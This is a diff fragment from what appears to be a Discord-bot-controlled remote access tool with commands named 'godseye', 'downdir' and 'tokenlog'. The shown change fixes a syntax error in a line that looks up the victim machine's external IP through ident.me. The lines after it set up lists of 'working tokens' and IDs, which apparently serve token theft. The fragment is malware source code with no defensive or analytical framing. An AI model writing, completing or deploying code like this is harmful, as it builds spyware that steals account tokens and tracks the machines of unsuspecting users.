@@ -253,7 +253,7 @@ async def downdir(ctx,arg):
 
 @godseye.command()
 async def tokenlog(ctx):
-  external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8'
+  external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
   embeds = []
   working_tokens = []
   working_ids = []
